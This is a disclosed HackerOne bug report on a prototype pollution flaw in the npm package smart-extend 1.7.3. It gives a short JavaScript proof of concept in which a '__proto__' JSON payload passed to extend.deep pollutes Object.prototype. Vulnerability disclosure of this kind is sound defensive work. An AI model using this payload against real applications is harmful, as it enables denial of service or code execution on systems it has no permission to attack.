# Prototype pollution attack (smart-extend)

## Report Details
- **Report ID**: 438274
- **URL**: https://hackerone.com/reports/438274
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-11-09T16:05:18.849Z
- **Disclosed**: 2019-04-03T20:13:18.331Z

## Reporter
- **Username**: dienpv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi team,
I would like to report a prototype pollution vulnerability in smart-extend
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** smart-extend
**version:** 1.7.3
**npm page:** `https://www.npmjs.com/package/smart-extend`

## Module Description

> smart-extend is an extension to jQuery's classic extend() method with additional features providing you with more power and control over your object extensions/clones. Works in both Node.JS and the browser.

## Module Stats

> 40.948 downloads in the last week

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar the report of Olivier #310443
only `deep` function is vulnerable when it performs a recursive copy of the specified objects.

## Steps To Reproduce:
In the following code snippet, "payload" would come from user-input (JSON data) 

```javascript
var extend = require('smart-extend');

var payload = '{"__proto__":{"polluted":"deep_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
extend.deep({},JSON.parse(payload));
console.log("After: ", test.polluted);
```
get results:
```
Before:  undefined
After:  deep_done !
```
# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N 

> Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Attachments
No attachments
